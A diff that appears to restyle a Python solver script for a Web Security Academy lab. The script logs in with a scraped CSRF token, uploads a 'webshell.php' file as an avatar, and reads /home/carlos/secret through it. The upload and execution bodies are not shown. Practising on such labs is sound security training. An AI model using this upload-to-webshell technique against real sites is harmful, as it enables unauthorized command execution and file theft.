@@ -3,9 +3,10 @@ import sys
 from bs4 import BeautifulSoup
 
 
+
 def extract_csrf_token(response):
-    soup = BeautifulSoup(response.text, 'html.parser')
-    csrf_token = soup.find('input', {'name': 'csrf'})['value']
+    soup = BeautifulSoup(response.text, "html.parser")
+    csrf_token = soup.find("input", {"name": "csrf"})["value"]
     return csrf_token
 
 
@@ -24,7 +25,6 @@ def get_cookie(url):
         cookie = login_response.cookies.values()[0]
         return cookie
 
-
     except requests.exceptions.RequestException as e:
         print(f"(-) An error has occurred: {e}")
         sys.exit(1)
@@ -32,6 +32,7 @@ def get_cookie(url):
     except IndexError:
         print("(-) Cookie not found in the response, check your url and try again.")
         sys.exit(1)
+
 
 def upload_file(url, cookie):
     response = requests.get(f"{url}/my-account", cookies={"session": cookie})
@@ -56,17 +57,18 @@ def execute_command(url, cookie):
 
 def main():
     if len(sys.argv) != 2:
-        print(f"(+) Usage: python3 {sys.argv[0]} <url>")
+        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
         print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
         sys.exit(1)
 
-    url = sys.argv[1].rstrip('/')
+
+    url = sys.argv[1].rstrip("/")
     print("(+) Logging in...")
     cookie = get_cookie(url)
     print("(+) Uploading webshell.php...")
     upload_file(url, cookie)
     print(f"(+) File has been uploaded here: {url}/files/avatars/webshell.php")
-    print("(+) The contents of the /home/carlos/secret file: ", end='')
+    print("(+) The contents of the /home/carlos/secret file: ", end="")
     execute_command(url, cookie)
 
 
